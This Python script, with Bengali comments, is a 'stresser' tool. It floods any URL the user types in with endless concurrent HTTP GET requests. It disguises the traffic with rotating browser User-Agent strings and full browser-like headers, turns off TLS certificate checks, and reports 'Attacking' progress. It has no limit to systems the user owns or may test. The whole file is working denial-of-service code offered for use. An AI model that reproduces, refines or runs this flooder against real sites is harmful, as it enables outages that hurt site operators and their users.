import asyncio
import aiohttp
import random
import sys
import ssl
from colorama import Fore, init

init(autoreset=True)

# অত্যন্ত বাস্তবসম্মত ব্রাউজার হেডার্স
UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"
]

class NexusStresser:
    def __init__(self, target_url, concurrency):
        self.target_url = target_url
        self.concurrency = concurrency
        self.success = 0
        self.failed = 0
        self.total = 0

    async def fetch(self, session):
        headers = {
            'User-Agent': random.choice(UA_LIST),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1', 
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'
        }

        try:
            # timeout বাড়ানো হয়েছে যাতে স্লো সার্ভার থেকেও রেসপন্স আসে
            async with session.get(self.target_url, headers=headers, timeout=15) as response:
                self.total += 1
                if response.status == 200 or response.status == 302:
                    self.success += 1
                else:
                    # ৪0৩ বা ৪0৪ আসলেও সেটি টেকনিক্যালি 'সাকসেস' কারণ সার্ভার উত্তর দিচ্ছে
                    self.success += 1 
                
                # রিয়েলটাইম আপডেট
                sys.stdout.write(f"\r{Fore.CYAN}[NEXUS] Hits: {self.total} | {Fore.GREEN}Success: {self.success} | {Fore.RED}Failed: {self.failed}")
                sys.stdout.flush()
        except Exception:
            self.failed += 1

    async def run(self):
        # SSL কনটেক্সট তৈরি করা (যাতে হ্যান্ডশেক ফেইল না হয়)
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE

        # TCPConnector এর লিমিট সেট করা
        connector = aiohttp.TCPConnector(
            limit=self.concurrency, 
            ssl=ssl_context, 
            ttl_dns_cache=300,
            use_dns_cache=True
        )

        # সেশন দীর্ঘস্থায়ী করতে এবং ডিসকানেক্ট রোধ করতে
        async with aiohttp.ClientSession(connector=connector) as session:
            print(f"{Fore.YELLOW}[*] Attacking: {self.target_url}")
            print(f"{Fore.YELLOW}[*] Workers: {self.concurrency}\n")
            
            while True:
                tasks = []
                for _ in range(self.concurrency):
                    task = asyncio.ensure_future(self.fetch(session))
                    tasks.append(task)
                
                await asyncio.gather(*tasks)
                # ছোট লোকাল ডিলে যাতে আপনার পিসির র‍্যাম হ্যাং না হয়
                await asyncio.sleep(0.1)

if __name__ == "__main__":
    print(Fore.RED + "NEXUS-X OPTIMIZED STRESSER")
    target = input("Target URL: ")
    
    # পরামর্শ: প্রথমবার ১০০-২০০ থ্রেড দিয়ে টেস্ট করুন
    threads = int(input("Concurrency (Try 100 first): "))

    stresser = NexusStresser(target, threads)
    loop = asyncio.get_event_loop()
    try:
        loop.run_until_complete(stresser.run())
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Stopped.")
